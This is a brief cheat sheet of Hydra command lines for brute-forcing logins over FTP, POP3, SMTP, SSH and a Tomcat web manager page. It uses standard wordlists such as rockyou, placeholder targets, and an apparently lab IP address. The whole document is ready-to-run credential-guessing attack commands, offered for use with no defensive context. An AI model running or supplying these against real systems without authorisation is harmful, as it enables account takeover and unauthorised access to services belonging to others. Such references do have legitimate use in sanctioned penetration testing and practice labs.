# Hydra Brute Force
### FTP Brute Force:
```
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V
```
### POP3 Brute Force:
```
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V
```
### SMTP Brute Force:
```
hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V
```
Use -t to limit concurrent connections, example: -t 15
### Web Login Form:
```
hydra -L /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt -s 8080 -f 10.129.35.106 http-get /manager/html
```

### SSH:
```
hydra -l root -p admin 192.168.1.105 -t 4 ssh
```

